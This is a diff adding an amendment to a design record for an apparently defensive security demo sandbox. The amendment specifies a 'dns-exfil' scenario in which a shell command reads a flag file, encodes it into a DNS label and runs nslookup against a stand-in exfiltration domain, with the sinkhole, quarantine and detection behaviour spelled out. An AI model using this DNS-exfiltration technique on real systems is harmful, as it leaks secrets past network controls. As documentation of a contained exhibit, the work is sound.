@@ -223,3 +223,27 @@ and never forwards; the argv ends `; true` because `nslookup` exits non-zero on 
 Falco events, so a rule that starts catching it turns the test red. `tests/scenarios/offline.sh` proves the
 argv and the label form under the pod's security context; the lookup itself is proven live. The SIEM's side
 (the Hubble DNS finding, the correlation, the API's flag match) is ADR 0034's.
+
+## Amendment 2026-10-04: `dns-exfil` exits 0 only on NXDOMAIN, not `; true` (siem contract D3, F10)
+
+The amendment above has the argv end `; true`. As built it does not: a command reaches its objective
+when it exits 0 (`Achieved = cmd.Objective != "" && code == 0`, runner/terminal.go), so `; true` would
+mark "Phone home" achieved even in a quarantined pod, whose lookup Cilium drops before it leaves the
+pod - a claim the page must not make. The argv (cluster/infra/sandbox/scenarios/scenarios.yaml, id
+`dns-exfil`) is `sh -c` with ash builtins and busybox `nslookup` only:
+- read the first line of `/srv/shop/.flag`, strip `SDP{` and `}`; anything that is not exactly 16
+  lowercase hex digits ends the command with exit 1 (`no flag found` for non-hex), so the label can
+  only ever be `sdp-<16 hex>` and nothing else can be put into the name;
+- print `query sdp-<16 hex>.x.exfil.sdp.test.`, then `nslookup -type=a` of that name and its output;
+- exit 0 only if the output says NXDOMAIN - the answer only the cluster resolver's sinkhole gives
+  (ADR 0026 amendment of 2026-10-04) - and 1 otherwise.
+The catalogue's outcome stays `allowed`: prevention lets the query through, and that is the exhibit.
+Measured (tests/scenarios/offline.sh, terminal pod's security context): against the rendered CoreDNS
+the command exits 0 with NXDOMAIN; with no network it exits 1 in 0.05 s; against a resolver that drops
+every query - what a quarantined pod meets - busybox `nslookup` gives up after 5.0-5.1 s with
+";; connection timed out; no servers could be reached" and the command exits 1 (N9). busybox has no
+timeout option, so the API's 5 s CommandTimeout usually cuts it first; either way it is not achieved.
+tests/scenarios/run.sh bounds every dns-exfil exec with `timeout 6` and asserts both cases live (exit 0
+with NXDOMAIN on the quiet pod; no NXDOMAIN and a non-zero exit on the pod `beacon` quarantined).
+The visitor's input line reads `nslookup sdp-<flag>.x.exfil.sdp.test.` and the explanation says that
+the command reads the flag file and builds the label: what is displayed is what runs (M12).
